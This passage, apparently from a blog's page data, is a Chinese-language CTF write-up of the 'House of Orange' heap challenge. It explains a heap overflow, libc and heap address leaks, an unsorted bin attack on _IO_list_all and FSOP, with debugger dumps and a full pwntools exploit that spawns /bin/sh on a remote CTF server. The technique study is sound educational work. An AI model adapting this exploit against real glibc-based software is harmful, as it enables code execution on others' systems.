class=\"number\">0xddaa</span>)+p32(<span class=\"number\">0x1</span>)+p64(<span class=\"number\">0</span>) <span class=\"comment\"># padding + calloc(0x8)</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0xf91</span>) <span class=\"comment\"># top chunk size == 0xf91</span></span><br><span class=\"line\">upgrade(<span class=\"number\">0x50</span>,payload,<span class=\"number\">1</span>,<span class=\"number\">56746</span>) </span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">add(<span class=\"number\">0xfc0</span>,<span class=\"string\">&#x27;aaaabbbb&#x27;</span>,<span class=\"number\">1</span>,<span class=\"number\">56746</span>) <span class=\"comment\"># house of orange free top chunk</span></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">add(<span class=\"number\">0x600</span>,<span class=\"string\">&#x27;ccccdddd&#x27;</span>,<span class=\"number\">1</span>,<span class=\"number\">56746</span>) <span class=\"comment\"># cut a large bin chunk from old top chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc and heap address by bk and fd_nextsize</span></span><br><span class=\"line\">see()</span><br><span class=\"line\">ru(<span class=\"string\">&quot;Name of house : &quot;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&quot;ccccdddd&quot;</span>)</span><br><span class=\"line\">libcbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>]) -<span class=\"number\">0x610</span> -<span class=\"number\">88</span> -<span class=\"number\">0x10</span> -libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">upgrade(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;f&#x27;</span>*<span class=\"number\">0x10</span>,<span class=\"number\">1</span>,<span class=\"number\">56746</span>)</span><br><span class=\"line\">see()</span><br><span class=\"line\">ru(<span class=\"string\">&quot;Name of house : &quot;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;f&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">heapbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])-<span class=\"number\">0xd0</span></span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;heapbase&quot;</span>,<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># FSOP</span></span><br><span class=\"line\">IO_list_all=libcbase+libc.sym[<span class=\"string\">&#x27;_IO_list_all&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&quot;IO_list_all&quot;</span>,<span class=\"built_in\">hex</span>(IO_list_all))</span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x600</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x21</span>)+p64(<span class=\"number\">0x0000ddaa00000001</span>)+p64(<span class=\"number\">0</span>) <span class=\"comment\"># before unsorted bin</span></span><br><span class=\"line\">fakefile=<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>+p64(<span class=\"number\">0x61</span>)+p64(<span class=\"number\">0</span>)+p64(IO_list_all-<span class=\"number\">0x10</span>) <span class=\"comment\"># reset bk and construct fake _IO_2_1_stdout</span></span><br><span class=\"line\"><span class=\"comment\"># construct fake _IO_2_1_stdout</span></span><br><span class=\"line\">fakefile+=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>) <span class=\"comment\"># write_base &lt; write_ptr</span></span><br><span class=\"line\">fakefile=fakefile.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fakefile+=p64(heapbase+<span class=\"number\">0x700</span>+<span class=\"number\">0xf0</span>-<span class=\"number\">0x18</span>) <span class=\"comment\"># vtable</span></span><br><span class=\"line\">fakefile+=p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span></span><br><span class=\"line\">fakefile+=p64(sys_addr)</span><br><span class=\"line\">payload+=fakefile</span><br><span class=\"line\">leak(<span class=\"string\">&quot;system&quot;</span>,<span class=\"built_in\">hex</span>(IO_list_all))</span><br><span class=\"line\">upgrade(<span class=\"number\">0x600</span>+<span class=\"built_in\">len</span>(payload),payload,<span class=\"number\">1</span>,<span class=\"number\">56746</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"><span class=\"comment\"># trigger by add</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Your choice : &quot;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>这题似乎是house of orange的起源，堆题经典保护全开，也是经典的菜单。</p>","more":"<p>这题似乎是house of orange的起源，堆题经典保护全开，也是经典的菜单。</p>\n<p>不过只有增查改，没有删除功能，最多只能申请4个chunk，size&lt;=0x1000。</p>\n<p>结构体house:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">house</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> price;</span><br><span class=\"line\">    <span class=\"type\">int</span> color; <span class=\"comment\">//56746 or 31~37</span></span><br><span class=\"line\">    <span class=\"type\">char</span>* name;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中的price和color的0x8字节是用calloc申请的。</p>\n<p>在see house的功能中，如果color为56746，那么只会从0x202080+一个随机数处输出一段字符串，不会输出color。那一段字符串只是不同表情的橙子。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *(_DWORD *)(*new_house + <span class=\"number\">4LL</span>) == <span class=\"number\">56746</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Name of house : %s\\n&quot;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)new_house[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Price of orange : %d\\n&quot;</span>, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)*new_house);</span><br><span class=\"line\">  v0 = rand();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\x1B[01;38;5;214m%s\\x1B[0m\\n&quot;</span>, *((<span class=\"type\">const</span> <span class=\"type\">char</span> **)&amp;unk_203080 + v0 % <span class=\"number\">8</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>upgrade功能只能调用3次，在upgrade中没有比较两次的size，因此在输入name的时候存在堆溢出。</p>\n<p>再仔细看可以发现，在输入name的时候使用的是read，没有在末尾加上<code>&#39;\\x00&#39;</code>，因此有泄露信息的机会。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Length of name :&quot;</span>);</span><br><span class=\"line\">size = get_num();                             <span class=\"comment\">// 没有和原来的size比较</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( size &gt; <span class=\"number\">0x1000</span> )</span><br><span class=\"line\">  size = <span class=\"number\">4096</span>;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Name:&quot;</span>);</span><br><span class=\"line\">read_buf((<span class=\"type\">void</span> *)new_house[<span class=\"number\">1</span>], size);         <span class=\"comment\">// 存在堆溢出</span></span><br></pre></td></tr></table></figure>\n\n<p>但是程序并没有free，要free的话只能利用house of orange。</p>\n<p>里面每次的see、upgrade功能均只会对最新build的house进行操作。每次build了一个house之后，new_house就被赋值为新创建的house。</p>\n<p>这道题的总体思路：</p>\n<p><code>House of Orange leak libc -&gt; unsorted bin attack 劫持 _IO_list_all -&gt; FSOP -&gt; 走malloc出现错误到_IO_OVERFLOW </code></p>\n<h2 id=\"leak-libc\"><a href=\"#leak-libc\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h2><p>因为build的功能中对name而言，并没有清除原有的信息，因此free后再malloc可以泄露bin中关于libc和heapbase的信息。我们可以通过house of orange将old top chunk释放到unsorted bin。</p>\n<p>house of orange关键在于要合理伪造新的top chunk size绕过检测，检测如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class=\"number\">0</span>) ||</span><br><span class=\"line\">          ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (old_size) &gt;= MINSIZE &amp;&amp; <span class=\"comment\">//old size&gt;=MINSIZE==0x20</span></span><br><span class=\"line\">           prev_inuse (old_top) &amp;&amp; <span class=\"comment\">//old top chunk&#x27;s prev_inuse==1 最低位为1</span></span><br><span class=\"line\">           ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) old_end &amp; (pagesize - <span class=\"number\">1</span>)) == <span class=\"number\">0</span>)); </span><br><span class=\"line\"><span class=\"comment\">//old_top_chunk_addr+old_size-1==n*0x1000 页地址要对齐，old top chunk后面要是新的一页</span></span><br></pre></td></tr></table></figure>\n\n<p>之后再通过malloc从中切割出新的chunk用来存放name，这个chunk最好是<strong>large bin chunk，这样chunk中的fd和bk指针可以用来泄露libc，fd_nextsize和bk_nextsize则可以用来泄露heapbase</strong>，一次是泄露不完的，可以修改两次分别泄露两个信息。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//从old top chunk中切割出来的chunk</span></span><br><span class=\"line\"><span class=\"number\">0x5647bb6470d0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000611</span></span><br><span class=\"line\"><span class=\"number\">0x5647bb6470e0</span>:\t<span class=\"number\">0x6464646463636363</span>\t<span class=\"number\">0x00007f625ca78188</span></span><br><span class=\"line\"><span class=\"number\">0x5647bb6470f0</span>:\t<span class=\"number\">0x00005647bb6470d0</span>\t<span class=\"number\">0x00005647bb6470d0</span></span><br></pre></td></tr></table></figure>\n\n<p>而old top chunk中余下的部分就有回到了unsorted bin中。</p>\n<h2 id=\"FSOP\"><a href=\"#FSOP\" class=\"headerlink\" title=\"FSOP\"></a>FSOP</h2><p>当malloc出现错误的时候，会调用一系列函数，其调用链为：</p>\n<p><code>malloc() -&gt; malloc_printerr() -&gt; __libc_message() -&gt; abort() -&gt; fflush() -&gt; _IO_flush_all_lockp()</code></p>\n<p>而<code>_IO_flush_all_lockp()</code>会从<code>_IO_list_all</code>开始遍历链表，对所有的IO_FILE逐一进行检查，如果检查通过，那么<code>_IO_OVERFLOW</code>会从虚表中调用<code>_IO_new_file_overflow()</code>。如果我们能**劫持虚表的<code>_IO_new_file_overflow()</code>**，那么就能通过malloc的异常get shell。</p>\n<p>在leak完成之后，我们得到了libcbase和heapbase，但也只剩下1次build和1次upgrade了，进行FSOP需要我们能劫持文件流，并触发对应的函数，因此在upgrade中就要构造好文件流，之后在最后一次build中触发。</p>\n<p>1次堆溢出可以让我们控制unsorted bin中的留下的free chunk。劫持文件流首先就要控制<code>_IO_list_all</code>，我们可以通过堆溢出控制unsorted bin chunk的bk指针，利用unsorted bin attack将unsorted bin头写到<code>_IO_list_all</code>中，这样<code>_IO_list_all</code>就不再指向<code>_IO_2_1_stderr</code>而是指向<strong>unsorted bin头</strong>。</p>\n<p>之后我本以为可以在unsorted bin处伪造<code>_IO_2_1_stderr</code>，但实际上是不行的。写入后的<code>_IO_list_all</code>直接指向<strong>unsorted bin头，而不是unsorted bin</strong>，因此其后面的字段是其他的bin头，而不是unsorted bin中的内容。因此不能直接伪造<code>_IO_2_1_stderr</code>，但是IO_FILE通过<code>_chain</code>字段形成链表，我们可以控制<code>_chain</code>来伪造<code>_IO_2_1_stdout</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus*)<span class=\"number\">0x7f887ea5bb78</span></span><br><span class=\"line\">$<span class=\"number\">2</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-1188204592</span>,</span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x5565b92b5700</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x5565b92b5700</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x5565b92b5700</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x7f887ea5bb88</span> &lt;main_arena+<span class=\"number\">104</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x7f887ea5bb88</span> &lt;main_arena+<span class=\"number\">104</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x7f887ea5bb98</span> &lt;main_arena+<span class=\"number\">120</span>&gt; <span class=\"string\">&quot;\\210\\273\\245~\\210\\177&quot;</span>,</span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x7f887ea5bb98</span> &lt;main_arena+<span class=\"number\">120</span>&gt; <span class=\"string\">&quot;\\210\\273\\245~\\210\\177&quot;</span>,</span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x7f887ea5bba8</span> &lt;main_arena+<span class=\"number\">136</span>&gt; <span class=\"string\">&quot;\\230\\273\\245~\\210\\177&quot;</span>,</span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x7f887ea5bba8</span> &lt;main_arena+<span class=\"number\">136</span>&gt; <span class=\"string\">&quot;\\230\\273\\245~\\210\\177&quot;</span>,</span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x7f887ea5bbb8</span> &lt;main_arena+<span class=\"number\">152</span>&gt; <span class=\"string\">&quot;\\250\\273\\245~\\210\\177&quot;</span>,</span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x7f887ea5bbb8</span> &lt;main_arena+<span class=\"number\">152</span>&gt; <span class=\"string\">&quot;\\250\\273\\245~\\210\\177&quot;</span>,</span><br><span class=\"line\">    _markers = <span class=\"number\">0x7f887ea5bbc8</span> &lt;main_arena+<span class=\"number\">168</span>&gt;,</span><br><span class=\"line\">    _chain = <span class=\"number\">0x7f887ea5bbc8</span> &lt;main_arena+<span class=\"number\">168</span>&gt;,</span><br><span class=\"line\">    _fileno = <span class=\"number\">2124790744</span>,</span><br><span class=\"line\">    _flags2 = <span class=\"number\">32648</span>,</span><br><span class=\"line\">    _old_offset = <span class=\"number\">140224217070552</span>,</span><br><span class=\"line\">    _cur_column = <span class=\"number\">48104</span>,</span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">-91</span> <span class=\"string\">&#x27;\\245&#x27;</span>,</span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;~&quot;</span>,</span><br><span class=\"line\">    _lock = <span class=\"number\">0x7f887ea5bbe8</span> &lt;main_arena+<span class=\"number\">200</span>&gt;,</span><br><span class=\"line\">    _offset = <span class=\"number\">140224217070584</span>,</span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x7f887ea5bbf8</span> &lt;main_arena+<span class=\"number\">216</span>&gt;,</span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x7f887ea5bc08</span> &lt;main_arena+<span class=\"number\">232</span>&gt;,</span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x7f887ea5bc08</span> &lt;main_arena+<span class=\"number\">232</span>&gt;,</span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x7f887ea5bc18</span> &lt;main_arena+<span class=\"number\">248</span>&gt;,</span><br><span class=\"line\">    __pad5 = <span class=\"number\">140224217070616</span>,</span><br><span class=\"line\">    _mode = <span class=\"number\">2124790824</span>,</span><br><span class=\"line\">    _unused2 = <span class=\"string\">&quot;\\210\\177\\000\\000(\\274\\245~\\210\\177\\000\\000\\070\\274\\245~\\210\\177\\000&quot;</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = <span class=\"number\">0x7f887ea5bc38</span> &lt;main_arena+<span class=\"number\">280</span>&gt;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，在<code>_IO_list_all</code>被修改后，<code>_chain</code>字段对应的是<code>main_arena+168</code>，在bin中对应的就是size为0x60的small bin，因此如果能在small bins[4]的位置放入一个chunk，那么<code>_chain</code>字段就会指向该chunk，将该chunk当作是<code>_IO_2_1_stdout</code>，我们在该chunk中伪造stdout即可。</p>\n<p>而要放入small bins[4]也不困难，我们将unsorted bin chunk的size修改为0x61，后面build时malloc的第1个chunk的大小一定是0x21，不满足条件，这个unsorted bin中的chunk一定会被放入small bins[4]中，这样通过<code>_chain</code>找到该chunk。fake file的构造如下：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># construct fake _IO_2_1_stdout</span></span><br><span class=\"line\">fakefile=<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>+p64(<span class=\"number\">0x61</span>)+p64(<span class=\"number\">0</span>)+p64(IO_list_all-<span class=\"number\">0x10</span>) <span class=\"comment\"># reset bk </span></span><br><span class=\"line\">fakefile+=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>) <span class=\"comment\"># write_base &lt; write_ptr</span></span><br><span class=\"line\">fakefile=fakefile.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fakefile+=p64(heapbase+<span class=\"number\">0x700</span>+<span class=\"number\">0xf0</span>-<span class=\"number\">0x18</span>) <span class=\"comment\"># vtable, make _IO_overflow_t &lt;vtable+3*0x8&gt;==sys_addr</span></span><br><span class=\"line\">fakefile+=p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span></span><br><span class=\"line\">fakefile+=p64(sys_addr)</span><br></pre></td></tr></table></figure>\n\n<p>之后就在该chunk中构造<code>_IO_2_1_stdout</code>以及vtable即可，只要偏移算对就没什么问题了。最后伪造chunk头为”/bin/sh\\x00”，伪造<code>_IO_overflow_t</code>为system，在对该fake file调用<code>_IO_new_file_overflow()</code>时即可调用<code>system(&quot;/bin/sh\\x00&quot;)</code>get shell。</p>\n<p>最终exp:（只能打通本地，打不通buu，应该是libc不对）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;orange&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">27360</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,name,price,color</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Your choice : &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Length of name :&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Name :&quot;</span>)</span><br><span class=\"line\">  s(<span class=\"built_in\">str</span>(name))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Price of Orange:&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(price))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Color of Orange:&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(color))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">see</span>():</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Your choice : &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">upgrade</span>(<span class=\"params\">size,name,price,color</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Your choice : &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Length of name :&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Name:&quot;</span>)</span><br><span class=\"line\">  s(<span class=\"built_in\">str</span>(name))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Price of Orange: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(price))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Color of Orange: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(color))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>,<span class=\"number\">1</span>,<span class=\"number\">56746</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x21</span>)+p32(<span class=\"number\">0xddaa</span>)+p32(<span class=\"number\">0x1</span>)+p64(<span class=\"number\">0</span>) <span class=\"comment\"># padding + calloc(0x8)</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0xf91</span>) <span class=\"comment\"># top chunk size == 0xf91</span></span><br><span 